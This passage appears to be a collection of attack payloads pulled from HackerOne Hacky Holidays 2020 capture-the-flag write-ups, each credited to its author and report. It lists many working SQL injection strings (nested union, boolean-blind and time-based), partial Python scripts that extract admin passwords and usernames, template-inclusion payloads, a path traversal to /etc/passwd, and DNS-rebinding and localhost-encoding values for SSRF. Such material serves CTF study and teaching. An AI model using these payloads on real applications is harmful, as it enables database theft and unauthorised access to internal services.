On browsing [https://target.com/my-diary/?template=secretasecretaadmin.phpdmin.phpdmin.
```

**Parameter:** `template`
— [Successfully took down the Grinch and saved the holidays from being ruined](https://hackerone.com/reports/1067530) · h1-ctf · [shubhamz007](https://hackerone.com/shubhamz007)

### `6c066e04`

```
`$images` is the object containing names of images, so server takes names of images and creates a JSON object with `image` and `auth` parameters where in image parameter it adds image name to `r3c0n_server_4fdk59\/uploads\/imagename` and generates auth token for this and converts it to base64.
So, the goal here is to control name of image to achieve the SSRF.
Here nested SQL injection comes in play. The results returned by first query where we can inject contains 3 columns id, hash and name. Her
```

**Parameter:** `id`
— [Successfully took down the Grinch and saved the holidays from being ruined](https://hackerone.com/reports/1067530) · h1-ctf · [shubhamz007](https://hackerone.com/shubhamz007)

### `bf7dc134`

```
And server created auth token for us to perform SSRF.
When I entered something which does not exist on website like above example, I got response as
{F1132665}
Indicating it is performing request and 404 for not found, so by this way we can enumerate valid api endpoints and also when I sent something which is valid like `../api/` page I got response as
{F1132666}
So a blind SSRF, All we have to do based on response codes as described on [api][31] page.
[31]: https://target.com/r3c0n
```

**Parameter:** `id`
— [Successfully took down the Grinch and saved the holidays from being ruined](https://hackerone.com/reports/1067530) · h1-ctf · [shubhamz007](https://hackerone.com/shubhamz007)

### `783bfbdc`

```
Endpoint `user` seems interesting tried to find valid parameters and got 2 valid parameters.(Filtering based on response code if 400 then invalid parameter else valid parameter)
Query used `abc' UNION SELECT "2' UNION SELECT 1,1,'../api/user?parameter=abc' -- -",'1',1-- -`
```

**Parameter:** `id`
— [Successfully took down the Grinch and saved the holidays from being ruined](https://hackerone.com/reports/1067530) · h1-ctf · [shubhamz007](https://hackerone.com/shubhamz007)

### `87adff4d`

```
Damn, another SQL [like][32] query injection in username and password parameters.
[32]: https://target.com/2015-11-03-like-injection/      "like"
We can extract bit by bit by injecting `character%` and filtering results based on response codes if 204 then no data found and does not start with the specified character and if response as `invalid content type detected` then some data is found and it starts with specified character.
Using query `abc' UNION SELECT "2' UNION SELECT 1,1,'../api/user?u
```

**Parameter:** `id`
— [Successfully took down the Grinch and saved the holidays from being ruined](https://hackerone.com/reports/1067530) · h1-ctf · [shubhamz007](https://hackerone.com/shubhamz007)

### `53130b4f`

```
import requests
 import string

# All the printable characters
chars = string.printable
# Maintaining Session State
session = requests.Session()
final = ""
ct = 0
print("[*] Finding Password ... ")
password = 1
 while ct < 100 :
    ct = 1
    for char in chars:
        sqli="1' or (ascii(substr((select password from admin ) ,{},1))) ={} -- -".format(str(password),ord(char))
        post_parameters = {"name":str(sqli)}
        headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Ap
```

**Parameter:** `name`
— [Hacky Holidays Writeup](https://hackerone.com/reports/1067835) · h1-ctf · [cardinal](https://hackerone.com/cardinal)

### `c656caca`

```
.../r3c0n_server_4fdk59/album?hash=-1' union select 1,2,3 -- -
```

**Parameter:** `hash`
— [Hacky Holidays Writeup](https://hackerone.com/reports/1067835) · h1-ctf · [cardinal](https://hackerone.com/cardinal)

### `b44b5715`

```
https://target.com/r3c0n_server_4fdk59/album?hash=-1' UNION ALL SELECT 1, 2, group_concat(album_id,",",id,",",photo,";\n") from photo-- -
```

**Parameter:** `hash`
— [Hacky Holidays Writeup](https://hackerone.com/reports/1067835) · h1-ctf · [cardinal](https://hackerone.com/cardinal)

### `7e3eb464`

```
.../r3c0n_server_4fdk59/album?hash="-1' UNION ALL SELECT "-1' union all select NULL,NULL,'../api/endpoint'-- -",2,3-- -
```

**Parameter:** `hash`
— [Hacky Holidays Writeup](https://hackerone.com/reports/1067835) · h1-ctf · [cardinal](https://hackerone.com/cardinal)

### `233d6b86`

```
admin' AND (length((select table_name from information_schema.tables where table_schema='quiz' limit 0,1))) = 5 --
```

— [Hacky Holidays Writeup](https://hackerone.com/reports/1067835) · h1-ctf · [cardinal](https://hackerone.com/cardinal)

### `a4171ee5`

```
admin' AND (ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="quiz" LIMIT 0,1),1,1))) = 97--
```

— [Hacky Holidays Writeup](https://hackerone.com/reports/1067835) · h1-ctf · [cardinal](https://hackerone.com/cardinal)

### `ae9a8e03`

```
{"id":1}
```

**Parameter:** `id`
— [Hacky Holidays Writeup](https://hackerone.com/reports/1067835) · h1-ctf · [cardinal](https://hackerone.com/cardinal)

### `f13a4e0d`

```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
...

preview_markup=Hello+{{name}}{{template:38dhs_admins_only_header.html}}+....&preview_data={"name":"Alice","email":"alice@test.com"}
```

**Parameter:** `preview_markup`
— [A Visit from The Grinch ~ 'Twas the night before Hackmas...](https://hackerone.com/reports/1067912) · h1-ctf · [bendtheory](https://hackerone.com/bendtheory)

### `e0562491`

```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
...

preview_markup=Hello+{{name}}+....&preview_data={"name":"Alice{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"}
```

**Parameter:** `preview_data`
— [A Visit from The Grinch ~ 'Twas the night before Hackmas...](https://hackerone.com/reports/1067912) · h1-ctf · [bendtheory](https://hackerone.com/bendtheory)

### `435b0cb5`

```
123' UNION SELECT "' UNION SELECT 1,2,'../api/x'-- ","456","789"--
```

**Parameter:** `hash`
— [A Visit from The Grinch ~ 'Twas the night before Hackmas...](https://hackerone.com/reports/1067912) · h1-ctf · [bendtheory](https://hackerone.com/bendtheory)

### `920f7864`

```
grinch' AND 1=1;--
```

**Parameter:** `name`
— [A Visit from The Grinch ~ 'Twas the night before Hackmas...](https://hackerone.com/reports/1067912) · h1-ctf · [bendtheory](https://hackerone.com/bendtheory)

### `6dbaa94c`

```
' AND 1=1;--
```

**Parameter:** `hash`
— [A Visit from The Grinch ~ 'Twas the night before Hackmas...](https://hackerone.com/reports/1067912) · h1-ctf · [bendtheory](https://hackerone.com/bendtheory)

### `e6d066bd`

```
1' UNION SELECT "1' ORDER BY 3-- ","456","789" --
```

**Parameter:** `hash`
— [A Visit from The Grinch ~ 'Twas the night before Hackmas...](https://hackerone.com/reports/1067912) · h1-ctf · [bendtheory](https://hackerone.com/bendtheory)

### `c0fcf4ee`

```
1' UNION SELECT "' UNION SELECT 1,2,3'-- ","456","789"--
```

**Parameter:** `hash`
— [A Visit from The Grinch ~ 'Twas the night before Hackmas...](https://hackerone.com/reports/1067912) · h1-ctf · [bendtheory](https://hackerone.com/bendtheory)

### `eca39a51`

```
123' UNION SELECT "' UNION SELECT 1,2,'../api/x'-- ","456","789"--
```

**Parameter:** `hash`
— [A Visit from The Grinch ~ 'Twas the night before Hackmas...](https://hackerone.com/reports/1067912) · h1-ctf · [bendtheory](https://hackerone.com/bendtheory)

### `ffad33e4`

```
https://target.com/r3c0n_server_4fdk59/album?hash=123%27%20UNION%20SELECT%20%22%27%20UNION%20SELECT%201,2,%27../api/x%27--+%22,%22456%22,%22789%22--+
```

**Parameter:** `hash`
— [A Visit from The Grinch ~ 'Twas the night before Hackmas...](https://hackerone.com/reports/1067912) · h1-ctf · [bendtheory](https://hackerone.com/bendtheory)

### `24a28498`

```
https://target.com/r3c0n_server_4fdk59/album?hash=-4685%27%20UNION%20SELECT%20%22%27%20UNION%20SELECT%201,2,%27../api/user?username=%25%27--+%22,%22456%22,%22789%22--+
```

**Parameter:** `hash`
— [A Visit from The Grinch ~ 'Twas the night before Hackmas...](https://hackerone.com/reports/1067912) · h1-ctf · [bendtheory](https://hackerone.com/bendtheory)

### `96227c97`

```
' OR sleep(5)='
```

**Parameter:** `name`
— [HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags](https://hackerone.com/reports/1068434) · h1-ctf · [liamg](https://hackerone.com/liamg)

### `b35fcc06`

```
Jfjrir' union select 1;/*
```

**Parameter:** `name`
— [HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags](https://hackerone.com/reports/1068434) · h1-ctf · [liamg](https://hackerone.com/liamg)

### `c3d3a3e6`

```
Jfjrir' union select 1,2;/*
```

**Parameter:** `name`
— [HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags](https://hackerone.com/reports/1068434) · h1-ctf · [liamg](https://hackerone.com/liamg)

### `9c6cb2b6`

```
Jfjrir' union select 1,2,3;/*
```

**Parameter:** `name`
— [HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags](https://hackerone.com/reports/1068434) · h1-ctf · [liamg](https://hackerone.com/liamg)

### `d7337294`

```
Jfjrir' union select 1,2,3,4;/*
```

**Parameter:** `name`
— [HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags](https://hackerone.com/reports/1068434) · h1-ctf · [liamg](https://hackerone.com/liamg)

### `cfa09e98`

```
Jfjrir' union select 1,2,3,4 from admin;/*
```

— [HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags](https://hackerone.com/reports/1068434) · h1-ctf · [liamg](https://hackerone.com/liamg)

### `5d7073e3`

```
' or '1'='2
```

**Parameter:** `hash`
— [HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags](https://hackerone.com/reports/1068434) · h1-ctf · [liamg](https://hackerone.com/liamg)

### `4e43e041`

```
asdasd' UNION ALL SELECT 1,1,1;/*
```

**Parameter:** `hash`
— [HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags](https://hackerone.com/reports/1068434) · h1-ctf · [liamg](https://hackerone.com/liamg)

### `94ad82b7`

```
https://target.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20SELECT%20%224%27%20UNION%20SELECT%201,2,\%22../api/hello\%22;/*%22,1,1;/*
```

**Parameter:** `hash`
— [HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags](https://hackerone.com/reports/1068434) · h1-ctf · [liamg](https://hackerone.com/liamg)

### `36df7788`

```
../../../../../../../etc/passwd
```

**Parameter:** `template`
— [HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags](https://hackerone.com/reports/1068434) · h1-ctf · [liamg](https://hackerone.com/liamg)

### `cfa559bd`

```
' or ''='
```

**Parameter:** `name`
— [HackyHolidays H1 CTF Writeup](https://hackerone.com/reports/1068881) · h1-ctf · [mava](https://hackerone.com/mava)

### `8ddc406e`

```
GET /r3c0n_server_4fdk59/album?hash=-4685' UNION ALL SELECT "1' UNION ALL SELECT \"1\",\"4\",\"/api/\"-- -","1","2" -- - //
```

**Parameter:** `hash`
— [HackyHolidays H1 CTF Writeup](https://hackerone.com/reports/1068881) · h1-ctf · [mava](https://hackerone.com/mava)

### `9db67788`

```
' UNION select NULL;-- --> 404
' UNION select NULL,NULL;-- --> 404
' UNION select NULL,NULL,NULL;-- --> 200; column count is three
' UNION select NULL,NULL,NULL,NULL;-- --> 404
```

**Parameter:** `hash`
— [\[h1ctf-Grinch Networks\] MrR3b00t Saving the Christmas](https://hackerone.com/reports/1068934) · h1-ctf · [d3f4u17](https://hackerone.com/d3f4u17)

### `d1c14d5b`

```
select id, album_id, photo from photo where album_id='' UNION select null,null,'xyz.jpg'

MariaDB [test]> select id, album_id, photo from photo where album_id='' UNION select null,null,'xyz.jpg'
    -> ;
+------+----------+---------+
| id   | album_id | photo   |
+------+----------+---------+
| NULL |     NULL | xyz.jpg |
+------+----------+---------+
1 row in set (0.078 sec)
```

**Parameter:** `hash`
— [\[h1ctf-Grinch Networks\] MrR3b00t Saving the Christmas](https://hackerone.com/reports/1068934) · h1-ctf · [d3f4u17](https://hackerone.com/d3f4u17)

### `8d6815be`

```
' or (select sleep(15))-- -
```

**Parameter:** `name`
— [\[h1ctf-Grinch Networks\] MrR3b00t Saving the Christmas](https://hackerone.com/reports/1068934) · h1-ctf · [d3f4u17](https://hackerone.com/d3f4u17)

### `da8235d3`

```
' UNION select 1,NULL,NULL;--
```

**Parameter:** `hash`
— [\[h1ctf-Grinch Networks\] MrR3b00t Saving the Christmas](https://hackerone.com/reports/1068934) · h1-ctf · [d3f4u17](https://hackerone.com/d3f4u17)

### `52e5f4c7`

```
' UNION select 1, NULL, NULL;--
```

**Parameter:** `hash`
— [\[h1ctf-Grinch Networks\] MrR3b00t Saving the Christmas](https://hackerone.com/reports/1068934) · h1-ctf · [d3f4u17](https://hackerone.com/d3f4u17)

### `7d163273`

```
' UNION select null,null,'xyz.jpg'
```

**Parameter:** `album_id`
— [\[h1ctf-Grinch Networks\] MrR3b00t Saving the Christmas](https://hackerone.com/reports/1068934) · h1-ctf · [d3f4u17](https://hackerone.com/d3f4u17)

### `2823a51c`

```
https://target.com/r3c0n_server_4fdk59/album?hash=' UNION SELECT "' UNION select NULL,NULL,'xyz.jpg';--",NULL,NULL;--
```

**Parameter:** `hash`
— [\[h1ctf-Grinch Networks\] MrR3b00t Saving the Christmas](https://hackerone.com/reports/1068934) · h1-ctf · [d3f4u17](https://hackerone.com/d3f4u17)

### `401fcf4e`

```
make-1.1.1.1-rebindfor15s-127.0.0.1-rr.1u.ms
```

**Parameter:** `target`
— [hackyholidays CTF Writeup](https://hackerone.com/reports/1069080) · h1-ctf · [un5h4d0w](https://hackerone.com/un5h4d0w)

### `a495dcc4`

```
[::1]
```

— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `fd67cae0`

```
2130706433
```

— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `cd813c82`

```
A.1.1.1.1.1time.127.0.0.1.forever.rebind.network
```

— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `cf1f5b51`

```
select * from photo
where album_id='' and 1=0 union select 1,2,'our_path' --
```

**Parameter:** `album_id`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `7924919c`

```
' and 1=0 union select 0x2720616e6420313d3020756e696f6e2073656c65637420312c322c276f75725f7061746827202d2d20,2,3 --
```

**Parameter:** `album_id`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `1d0a05a1`

```
' or 1=1 --
```

**Parameter:** `name`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `a7e8dcfe`

```
select count(*) from information_schema.tables where table_schema like "quiz" and table_name like "' + tmp_known + '%" limit 1
```

— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `c60f8c59`

```
select count(*) from information_schema.columns where table_schema like "quiz" and table_name="admin" and column_name like "' + tmp_known + '%" limit 1
```

— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `531ffdb6`

```
select count(*) from information_schema.columns where table_schema like "quiz%" and table_name="admin" and column_name not in("id") and column_name like "' + tmp_known + '%" limit 1
```

— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `3aa9778e`

```
select count(*) from information_schema.columns where table_schema like "quiz%" and table_name="admin" and column_name not in("id","password") and column_name like "' + tmp_known + '%" limit 1
```

— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `1cd8d5bd`

```
jdh34k' and 1=1 -- .
```

**Parameter:** `hash`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `2bad9549`

```
jdh34k' and 1=0 -- .
```

**Parameter:** `hash`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `b9ce966f`

```
' and 1=0 union select 1 -- .
```

**Parameter:** `hash`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `1b7fc751`

```
' and 1=0 union select 1,2 -- .
```

**Parameter:** `hash`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `65391dee`

```
' and 1=0 union select 1,2,3 -- .
```

**Parameter:** `hash`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `6df21389`

```
' and 1=0 union select 1,2,'our_path' -- .
```

**Parameter:** `hash`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `cc245c67`

```
' and 1=0 union select SQLi_2,2,3 -- .
```

**Parameter:** `hash`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `16fb9dbd`

```
' and 1=0 union select 1,2,'../../' -- .
```

**Parameter:** `hash`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `8391e6f7`

```
' and 1=0 union select 0x2720616e6420313d3020756e696f6e2073656c65637420312c322c272e2e2f2e2e2f27202d2d20,2,3 --
```

**Parameter:** `hash`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `40c8d1c0`

```
{{template:cbdj3_grinch_header.html}}Hi {{name}}..... Guess what..... <strong>YOU SUCK!</strong>{{template:cbdj3_grinch_footer.html}}
```

**Parameter:** `markup`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `25ae1363`

```
{{template:<file-name>}}
```

**Parameter:** `markup`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `54356c13`

```
{{template:}}
```

**Parameter:** `markup`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `b52de00f`

```
{{payload}}
```

**Parameter:** `markup`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `665b2749`

```
{"payload":"{{template:38dhs_admins_only_header.html}}"}
```

**Parameter:** `data`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `101798d3`

```
' and 1=0 union select 1,2,'../../' -- .
```

**Parameter:** `hash`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `04079938`

```
a' UNION SELECT "2' UNION SELECT 1,1,'../api' --+-",1,1--+-
```

**Parameter:** `hash`
— [h1-ctf : 12 days of hack holiday writeup](https://hackerone.com/reports/1069175) · h1-ctf · [webhak](https://hackerone.com/webhak)

### `0c6f0fe9`

```
https://target.com/r3c0n_server_4fdk59/album?hash=a' UNION SELECT "2' UNION SELECT 1,1,'../api' --+-",1,1--+-
```

**Parameter:** `hash`
— [h1-ctf : 12 days of hack holiday writeup](https://hackerone.com/reports/1069175) · h1-ctf · [webhak](https://hackerone.com/webhak)

### `370adb34`

```
import requests
from bs4 import BeautifulSoup
import base64
import string

charset = string.ascii_lowercase + string.digits

base_url ="https://target.com/r3c0n_server_4fdk59/album?hash=a' UNION SELECT \"2' UNION SELECT 1,1,'{}' --+-\",1,1--+-"

def get_username():
    username = ""
    while True:
        found_char_previous_run = False
        for char in charset:
            test_string = username + char
            path = "../api/user?username={}%25".format(test_string)
        
```

**Parameter:** `hash`
— [h1-ctf : 12 days of hack holiday writeup](https://hackerone.com/reports/1069175) · h1-ctf · [webhak](https://hackerone.com/webhak)

### `a8ee0a8a`

```
a' UNION SELECT "2' UNION SELECT 1,1,'../api' --+-",1,1--+-
```

**Parameter:** `hash`
— [h1-ctf : 12 days of hack holiday writeup](https://hackerone.com/reports/1069175) · h1-ctf · [webhak](https://hackerone.com/webhak)

### `0ff6f7d9`

```
https://target.com/r3c0n_server_4fdk59/album?hash=a' UNION SELECT "2' UNION SELECT 1,1,'../api' --+-",1,1--+-
```

**Parameter:** `hash`
— [h1-ctf : 12 days of hack holiday writeup](https://hackerone.com/reports/1069175) · h1-ctf · [webhak](https://hackerone.com/webhak)

### `1c9f6893`

```
import requests
from bs4 import BeautifulSoup
import base64
import string

charset = string.ascii_lowercase + string.digits

base_url ="https://target.com/r3c0n_server_4fdk59/album?hash=a' UNION SELECT \"2' UNION SELECT 1,1,'{}' --+-\",1,1--+-"

def get_username():
    username = ""
    while True:
        found_char_previous_run = False
        for char in charset:
            test_string = username + char
            path = "../api/user?username={}%25".format(test_string)
        
```

**Parameter:** `hash`
— [h1-ctf : 12 days of hack holiday writeup](https://hackerone.com/reports/1069175) · h1-ctf · [webhak](https://hackerone.com/webhak)

### `3b6e8269`

```
hax" OR (select 1 from admin)#
```

**Parameter:** `name`
— [Grinch-Networks taken down - hacky holidays CTF ](https://hackerone.com/reports/1069189) · h1-ctf · [pirateducky](https://hackerone.com/pirateducky)

### `9a126765`

```
hax" OR (select count(password) from admin)#
```

**Parameter:** `name`
— [Grinch-Networks taken down - hacky holidays CTF ](https://hackerone.com/reports/1069189) · h1-ctf · [pirateducky](https://hackerone.com/pirateducky)

### `a1f1238a`

```
sql = `' union all select "3", 3, 'test' -- `;
encodeURI(`https://target.com/r3c0n_server_4fdk59/album?hash=${sql}`);
```

**Parameter:** `hash`
— [First CTF ever!](https://hackerone.com/reports/1069263) · h1-ctf · [eliee](https://hackerone.com/eliee)

### `73821555`

```
// this query assumes the /album first fetches the album id using hash
// and then plugs that album id into a query to fetch any relevant photos
// ie, the photo query's where statement becomes `album_id = 3' union select all 1, 2, 'waffle --
// this in turn will give us another row fetched where the photo url will include waffle
sql = `' union all select "3' union all select 1, 2, 'waffle -- ' -- ", 3, 'test' -- `;
encodeURI(`https://target.com/r3c0n_server_4fdk59/album?hash=${sql}
```

**Parameter:** `hash`
— [First CTF ever!](https://hackerone.com/reports/1069263) · h1-ctf · [eliee](https://hackerone.com/eliee)

### `0d8f9e34`

```
sql = `' union all select "3' union all select 1, 2, '../api/user' -- ", 3, 'test' -- `;
encodeURI(`https://target.com/r3c0n_server_4fdk59/album?hash=${sql}`);
```

**Parameter:** `hash`
— [First CTF ever!](https://hackerone.com/reports/1069263) · h1-ctf · [eliee](https://hackerone.com/eliee)

### `1ea13ac1`

```
sql = `' union all select "3' union all select 1, 2, '../api/user?id=1' -- ", 3, 'test' -- `;
encodeURI(`https://target.com/r3c0n_server_4fdk59/album?hash=${sql}`);
```

**Parameter:** `hash`
— [First CTF ever!](https://hackerone.com/reports/1069263) · h1-ctf · [eliee](https://hackerone.com/eliee)

### `4a191def`

```
myuniquename' or 1=1 --
```

**Parameter:** `name`
— [First CTF ever!](https://hackerone.com/reports/1069263) · h1-ctf · [eliee](https://hackerone.com/eliee)

### `691ce8be`

```
myuniquename' or 1=2 --
```

**Parameter:** `name`
— [First CTF ever!](https://hackerone.com/reports/1069263) · h1-ctf · [eliee](https://hackerone.com/eliee)

### `70adfdb4`

```
jdh34k' and 1=0 union all select 1,2,3;--
```

— [How The Hackers Saved Christmas](https://hackerone.com/reports/1069335) · h1-ctf · [nytr0gen](https://hackerone.com/nytr0gen)

### `520198e2`

```
jdh34k' and 1=0 union all select "1' and 1='1",2,3;--
```

**Parameter:** `1`
— [How The Hackers Saved Christmas](https://hackerone.com/reports/1069335) · h1-ctf · [nytr0gen](https://hackerone.com/nytr0gen)

### `77790c10`

```
jdh34k' and 1=0 union all select "1' and 1=0 union all select 4,5,6;--;--",2,3;--
```

— [How The Hackers Saved Christmas](https://hackerone.com/reports/1069335) · h1-ctf · [nytr0gen](https://hackerone.com/nytr0gen)

### `3478fcbb`

```
{{template:..}}
```

— [How The Hackers Saved Christmas](https://hackerone.com/reports/1069335) · h1-ctf · [nytr0gen](https://hackerone.com/nytr0gen)

### `a2755522`

```
https://target.com/people-rater/entry?id=eyJpZCI6Mn0=
```

**Parameter:** `id`
— [How The Hackers Saved Christmas](https://hackerone.com/reports/1069335) · h1-ctf · [nytr0gen](https://hackerone.com/nytr0gen)

### `31151a43`

```
+ Tried payload as " or sleep(5) on name area.

**Payloads**
{F1139545}

+ After injecting, submitting the request on quiz area
```

**Parameter:** `name`
— [Hackyholidays \[ h1-ctf\] writeup \[mission:- stop the grinch \]](https://hackerone.com/reports/1069396) · h1-ctf · [kunal94](https://hackerone.com/kunal94)

### `222e19f3`

```
Payload: name=hello' AND (SELECT 7752 FROM (SELECT(SLEEP(5)))EvEg) AND 'jenU'='jenU
```

**Parameter:** `name`
— [Hackyholidays \[ h1-ctf\] writeup \[mission:- stop the grinch \]](https://hackerone.com/reports/1069396) · h1-ctf · [kunal94](https://hackerone.com/kunal94)

### `651f42ed`

```
preview_markup=Hello{{name}}{{template:38dhs_admins_only_header.html}}{{email}}&preview_data={"name":"Alice","email":"alice@test.com"}
```

**Parameter:** `preview_markup`
— [Hackyholidays \[ h1-ctf\] writeup \[mission:- stop the grinch \]](https://hackerone.com/reports/1069396) · h1-ctf · [kunal94](https://hackerone.com/kunal94)

### `be55ea4e`

```
preview_markup={{email}}&preview_data={"name":"aaaa","email":"{{template:38dhs_admins_only_header.html}}"}
```

**Parameter:** `preview_data`
— [Hackyholidays \[ h1-ctf\] writeup \[mission:- stop the grinch \]](https://hackerone.com/reports/1069396) · h1-ctf · [kunal94](https://hackerone.com/kunal94)

### `3b3b0383`

```
https://target.com/r3c0n_server_4fdk59/album?hash=b%27%20UNION%20ALL%20SELECT%20%221%27%20UNION%20ALL%20SELECT%20%27c%27,%27b%27,%27../api%27--%20-%22,1,2--%20-
```

**Parameter:** `hash`
— [H1 Hackyholidays CTF - The Grinch was defeated](https://hackerone.com/reports/1069467) · h1-ctf · [val_brux](https://hackerone.com/val_brux)
